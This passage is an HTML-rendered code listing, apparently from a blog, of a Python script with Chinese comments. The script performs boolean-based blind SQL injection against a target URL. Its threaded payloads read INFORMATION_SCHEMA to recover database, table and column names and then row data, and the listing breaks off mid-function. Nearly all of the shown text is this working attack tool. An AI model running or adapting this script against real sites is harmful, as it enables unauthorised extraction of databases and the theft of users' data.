class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br><span class=\"line\">339</span><br><span class=\"line\">340</span><br><span class=\"line\">341</span><br><span class=\"line\">342</span><br><span class=\"line\">343</span><br><span class=\"line\">344</span><br><span class=\"line\">345</span><br><span class=\"line\">346</span><br><span class=\"line\">347</span><br><span class=\"line\">348</span><br><span class=\"line\">349</span><br><span class=\"line\">350</span><br><span class=\"line\">351</span><br><span class=\"line\">352</span><br><span class=\"line\">353</span><br><span class=\"line\">354</span><br><span class=\"line\">355</span><br><span class=\"line\">356</span><br><span class=\"line\">357</span><br><span class=\"line\">358</span><br><span class=\"line\">359</span><br><span class=\"line\">360</span><br><span class=\"line\">361</span><br><span class=\"line\">362</span><br><span class=\"line\">363</span><br><span class=\"line\">364</span><br><span class=\"line\">365</span><br><span class=\"line\">366</span><br><span class=\"line\">367</span><br><span class=\"line\">368</span><br><span class=\"line\">369</span><br><span class=\"line\">370</span><br><span class=\"line\">371</span><br><span class=\"line\">372</span><br><span class=\"line\">373</span><br><span class=\"line\">374</span><br><span class=\"line\">375</span><br><span class=\"line\">376</span><br><span class=\"line\">377</span><br><span class=\"line\">378</span><br><span class=\"line\">379</span><br><span class=\"line\">380</span><br><span class=\"line\">381</span><br><span class=\"line\">382</span><br><span class=\"line\">383</span><br><span class=\"line\">384</span><br><span class=\"line\">385</span><br><span class=\"line\">386</span><br><span class=\"line\">387</span><br><span class=\"line\">388</span><br><span class=\"line\">389</span><br><span class=\"line\">390</span><br><span class=\"line\">391</span><br><span class=\"line\">392</span><br><span class=\"line\">393</span><br><span class=\"line\">394</span><br><span class=\"line\">395</span><br><span class=\"line\">396</span><br><span class=\"line\">397</span><br><span class=\"line\">398</span><br><span class=\"line\">399</span><br><span class=\"line\">400</span><br><span class=\"line\">401</span><br><span class=\"line\">402</span><br><span class=\"line\">403</span><br><span class=\"line\">404</span><br><span class=\"line\">405</span><br><span class=\"line\">406</span><br><span class=\"line\">407</span><br><span class=\"line\">408</span><br><span class=\"line\">409</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#python3</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"><span class=\"keyword\">from</span> optparse <span class=\"keyword\">import</span> OptionParser</span><br><span class=\"line\"></span><br><span class=\"line\">feature = <span class=\"string\">'Your Login name'</span></span><br><span class=\"line\">head = <span class=\"string\">\"'\"</span></span><br><span class=\"line\">headers = &#123;</span><br><span class=\"line\">    <span class=\"string\">'user-agent'</span>: <span class=\"string\">'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0'</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getpayload</span><span class=\"params\">(url, payload)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> url + payload</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">binary_search_db</span><span class=\"params\">(url, payload)</span>:</span></span><br><span class=\"line\">    i = <span class=\"number\">1</span></span><br><span class=\"line\">    s = <span class=\"string\">\"\"</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">        count = <span class=\"number\">0</span></span><br><span class=\"line\">        mid = <span class=\"number\">0</span></span><br><span class=\"line\">        low = <span class=\"number\">47</span></span><br><span class=\"line\">        high = <span class=\"number\">57</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> low &lt;= high:</span><br><span class=\"line\">            mid = int((low + high) / <span class=\"number\">2</span>)</span><br><span class=\"line\">            newpayload = payload % (i, mid)</span><br><span class=\"line\">            html = requests.get(getpayload(url, newpayload),</span><br><span class=\"line\">                                headers=headers).text</span><br><span class=\"line\">            <span class=\"keyword\">if</span> feature <span class=\"keyword\">in</span> html:</span><br><span class=\"line\">                low = mid + <span class=\"number\">1</span></span><br><span class=\"line\">                count += <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                high = mid - <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> count != <span class=\"number\">0</span>:</span><br><span class=\"line\">            s = s + chr(int((low + high + <span class=\"number\">1</span>) / <span class=\"number\">2</span>))</span><br><span class=\"line\">            i = i + <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> int(s)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取当前数据库长度</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_db_len</span><span class=\"params\">(url)</span>:</span></span><br><span class=\"line\">    payload = head + \\</span><br><span class=\"line\">        <span class=\"string\">\" AND ORD(MID((SELECT LENGTH(database())),%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">    lenth = binary_search_db(url, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]当前数据库长度: %d'</span> % lenth)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取当前数据库名</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_cu_db_name</span><span class=\"params\">(url)</span>:</span></span><br><span class=\"line\">    lenth = get_db_len(url)</span><br><span class=\"line\">    dbname = <span class=\"string\">\"\"</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(lenth):</span><br><span class=\"line\">        payload = head + \\</span><br><span class=\"line\">            <span class=\"string\">\" and ascii(substr((select database()),%d,1))\"</span> % (i + <span class=\"number\">1</span>)</span><br><span class=\"line\">        dbname += and_method(url, payload)</span><br><span class=\"line\">        print(<span class=\"string\">'[-]当前猜解'</span>, dbname)</span><br><span class=\"line\">    print(<span class=\"string\">'[*]'</span>, dbname)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getdbnum</span><span class=\"params\">(url)</span>:</span></span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\">    payload = head + \\</span><br><span class=\"line\">        <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">    num = binary_search_db(url, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]数据库数 [%d]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_all_db_len</span><span class=\"params\">(url, num)</span>:</span></span><br><span class=\"line\">    thread = []</span><br><span class=\"line\">    key = []</span><br><span class=\"line\">    th = []</span><br><span class=\"line\">    lenth = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        payload = head + \\</span><br><span class=\"line\">            <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA limit i,1),%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">        payload = re.sub(<span class=\"string\">r'\\bi\\b'</span>, str(i), payload)</span><br><span class=\"line\">        key.append(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_thread</span><span class=\"params\">(stri, i)</span>:</span></span><br><span class=\"line\">        s = <span class=\"string\">\"db\"</span> + str(i) + <span class=\"string\">\":\"</span> + str(binary_search_db(url, stri))</span><br><span class=\"line\">        <span class=\"comment\"># print(s)</span></span><br><span class=\"line\">        th.append(s)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        t = threading.Thread(target=run_thread,</span><br><span class=\"line\">                             args=(key[i], i,))</span><br><span class=\"line\">        thread.append(t)</span><br><span class=\"line\">        thread[i].start()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        thread[i].join()</span><br><span class=\"line\">    th.sort()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> th:</span><br><span class=\"line\">        i = re.sub(<span class=\"string\">r'db\\d+\\:'</span>, <span class=\"string\">''</span>, i)</span><br><span class=\"line\">        lenth.append(i)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 取与法</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">and_method</span><span class=\"params\">(url, payload)</span>:</span></span><br><span class=\"line\">    two = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">4</span>, <span class=\"number\">8</span>, <span class=\"number\">16</span>, <span class=\"number\">32</span>, <span class=\"number\">64</span>, <span class=\"number\">128</span>]</span><br><span class=\"line\">    s = <span class=\"number\">0</span></span><br><span class=\"line\">    keys = []</span><br><span class=\"line\">    thread = []</span><br><span class=\"line\">    m = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_thread</span><span class=\"params\">(url, i, s)</span>:</span></span><br><span class=\"line\">        html = requests.get(url, headers=headers).text</span><br><span class=\"line\">        <span class=\"keyword\">if</span> feature <span class=\"keyword\">in</span> html:</span><br><span class=\"line\">            s = s | two[i]</span><br><span class=\"line\">            m.append(s)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">8</span>):</span><br><span class=\"line\">        newpayload = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        newpayload = payload + <span class=\"string\">\"%26\"</span> + <span class=\"string\">\"%d=%d--+\"</span> % (two[i], two[i])</span><br><span class=\"line\">        keys.append(newpayload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">8</span>):</span><br><span class=\"line\">        t = threading.Thread(target=run_thread, args=(</span><br><span class=\"line\">            getpayload(url, keys[i]), i, s,))</span><br><span class=\"line\">        thread.append(t)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> t <span class=\"keyword\">in</span> thread:</span><br><span class=\"line\">        t.start()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> t <span class=\"keyword\">in</span> thread:</span><br><span class=\"line\">        t.join()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> m:</span><br><span class=\"line\">        s = s | i</span><br><span class=\"line\">    <span class=\"keyword\">return</span> chr(s)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getdbname</span><span class=\"params\">(url)</span>:</span></span><br><span class=\"line\">    num = getdbnum(url)</span><br><span class=\"line\">    lenth = get_all_db_len(url, num)</span><br><span class=\"line\">    dbs = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(int(len(lenth))):</span><br><span class=\"line\">        dbname = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, int(lenth[i]) + <span class=\"number\">1</span>):</span><br><span class=\"line\">            payload = head + <span class=\"string\">\" and ascii(substr((select schema_name from information_schema.schemata limit %d,1),%d,1))\"</span> % (</span><br><span class=\"line\">                i, j)</span><br><span class=\"line\">            dbname += and_method(url, payload)</span><br><span class=\"line\">            print(<span class=\"string\">'[-]当前猜解'</span>, dbname)</span><br><span class=\"line\">        print(dbname)</span><br><span class=\"line\">        dbs.append(dbname)</span><br><span class=\"line\">    print(<span class=\"string\">'available databases [%s]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> db <span class=\"keyword\">in</span> dbs:</span><br><span class=\"line\">        print(<span class=\"string\">'[*]'</span>, db)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_table_num</span><span class=\"params\">(url, dbname)</span>:</span></span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\">    payload = head + \\</span><br><span class=\"line\">        <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s'),\"</span> % dbname</span><br><span class=\"line\">    payload += <span class=\"string\">\"%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">    <span class=\"comment\"># print(payload)</span></span><br><span class=\"line\">    num = binary_search_db(url, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]数据表数 [%d]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_all_table_len</span><span class=\"params\">(url, num, dbname)</span>:</span></span><br><span class=\"line\">    thread = []</span><br><span class=\"line\">    key = []</span><br><span class=\"line\">    th = []</span><br><span class=\"line\">    lenth = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        payload = head + \\</span><br><span class=\"line\">            <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s' limit i,1),\"</span> % dbname</span><br><span class=\"line\">        payload += <span class=\"string\">\"%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">        payload = re.sub(<span class=\"string\">r'\\bi\\b'</span>, str(i), payload)</span><br><span class=\"line\">        key.append(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_thread</span><span class=\"params\">(stri, i)</span>:</span></span><br><span class=\"line\">        s = <span class=\"string\">\"db\"</span> + str(i) + <span class=\"string\">\":\"</span> + str(binary_search_db(url, stri))</span><br><span class=\"line\">        <span class=\"comment\"># print(s)</span></span><br><span class=\"line\">        th.append(s)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        t = threading.Thread(target=run_thread,</span><br><span class=\"line\">                             args=(key[i], i,))</span><br><span class=\"line\">        thread.append(t)</span><br><span class=\"line\">        thread[i].start()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        thread[i].join()</span><br><span class=\"line\">    th.sort()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> th:</span><br><span class=\"line\">        i = re.sub(<span class=\"string\">r'db\\d+\\:'</span>, <span class=\"string\">''</span>, i)</span><br><span class=\"line\">        lenth.append(i)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_table_name</span><span class=\"params\">(url, dbname)</span>:</span></span><br><span class=\"line\">    num = get_table_num(url, dbname)</span><br><span class=\"line\">    lenth = get_all_table_len(url, num, dbname)</span><br><span class=\"line\">    tables = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(int(len(lenth))):</span><br><span class=\"line\">        tbname = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, int(lenth[i]) + <span class=\"number\">1</span>):</span><br><span class=\"line\">            payload = head + \\</span><br><span class=\"line\">                <span class=\"string\">\" and ascii(substr((select table_name from information_schema.tables WHERE TABLE_SCHEMA='%s' limit\"</span> % dbname</span><br><span class=\"line\">            payload += <span class=\"string\">\" %d,1),%d,1))\"</span> % (i, j)</span><br><span class=\"line\">            tbname += and_method(url, payload)</span><br><span class=\"line\">            print(<span class=\"string\">'[-]当前猜解'</span>, tbname)</span><br><span class=\"line\">        print(tbname)</span><br><span class=\"line\">        tables.append(tbname)</span><br><span class=\"line\">    print(<span class=\"string\">'Database: %s'</span> % dbname)</span><br><span class=\"line\">    print(<span class=\"string\">'[%d tables]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> table <span class=\"keyword\">in</span> tables:</span><br><span class=\"line\">        print(<span class=\"string\">'[*]'</span>, table)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取列数</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_column_num</span><span class=\"params\">(url, tbname, dbname)</span>:</span></span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\">    payload = head + <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='%s' AND TABLE_SCHEMA='%s'),\"</span> % (</span><br><span class=\"line\">        tbname, dbname)</span><br><span class=\"line\">    payload += <span class=\"string\">\"%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">    num = binary_search_db(url, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]列数 [%d]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取列长度</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_all_columns_len</span><span class=\"params\">(url, num, tbname, dbname)</span>:</span></span><br><span class=\"line\">    thread = []</span><br><span class=\"line\">    key = []</span><br><span class=\"line\">    th = []</span><br><span class=\"line\">    lenth = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        payload = head + <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='%s' AND TABLE_SCHEMA='%s' limit i,1),\"</span> % (</span><br><span class=\"line\">            tbname, dbname)</span><br><span class=\"line\">        payload += <span class=\"string\">\"%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">        payload = re.sub(<span class=\"string\">r'\\bi\\b'</span>, str(i), payload)</span><br><span class=\"line\">        key.append(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_thread</span><span class=\"params\">(stri, i)</span>:</span></span><br><span class=\"line\">        s = <span class=\"string\">\"co\"</span> + str(i) + <span class=\"string\">\":\"</span> + str(binary_search_db(url, stri))</span><br><span class=\"line\">        <span class=\"comment\"># print(s)</span></span><br><span class=\"line\">        th.append(s)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        t = threading.Thread(target=run_thread,</span><br><span class=\"line\">                             args=(key[i], i,))</span><br><span class=\"line\">        thread.append(t)</span><br><span class=\"line\">        thread[i].start()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        thread[i].join()</span><br><span class=\"line\">    th.sort()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> th:</span><br><span class=\"line\">        i = re.sub(<span class=\"string\">r'co\\d+\\:'</span>, <span class=\"string\">''</span>, i)</span><br><span class=\"line\">        lenth.append(i)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取列名</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_column_name</span><span class=\"params\">(url, tbname, dbname)</span>:</span></span><br><span class=\"line\">    num = get_column_num(url, tbname, dbname)</span><br><span class=\"line\">    lenth = get_all_columns_len(url, num, tbname, dbname)</span><br><span class=\"line\">    columns = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(int(len(lenth))):</span><br><span class=\"line\">        coname = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, int(lenth[i]) + <span class=\"number\">1</span>):</span><br><span class=\"line\">            payload = head + <span class=\"string\">\" and ascii(substr((select column_name from information_schema.columns where table_name='%s' and table_schema='%s' limit\"</span> % (</span><br><span class=\"line\">                tbname, dbname)</span><br><span class=\"line\">            payload += <span class=\"string\">\" %d,1),%d,1))\"</span> % (i, j)</span><br><span class=\"line\">            coname += and_method(url, payload)</span><br><span class=\"line\">            print(<span class=\"string\">'[-]当前猜解'</span>, coname)</span><br><span class=\"line\">        print(coname)</span><br><span class=\"line\">        columns.append(coname)</span><br><span class=\"line\">    print(<span class=\"string\">'Database: %s'</span> % dbname)</span><br><span class=\"line\">    print(<span class=\"string\">'Table: %s'</span> % tbname)</span><br><span class=\"line\">    print(<span class=\"string\">'[%d columns]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> column <span class=\"keyword\">in</span> columns:</span><br><span class=\"line\">        print(<span class=\"string\">'[*]'</span>, column)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> columns</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取字段数</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_data_num</span><span class=\"params\">(url, tbname, dbname)</span>:</span></span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\">    payload = head + \\</span><br><span class=\"line\">        <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM %s.%s),\"</span> % (dbname, tbname)</span><br><span class=\"line\">    payload += <span class=\"string\">\" %d,1))&gt;%d--+\"</span></span><br><span class=\"line\">    num = binary_search_db(url, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]字段数 [%d]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取字段长度</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_data_len</span><span class=\"params\">(url, coname, tbname, dbname, i)</span>:</span></span><br><span class=\"line\">    payload = head + <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(%s) AS CHAR),0x20) FROM %s.%s limit %d,1),\"</span> % 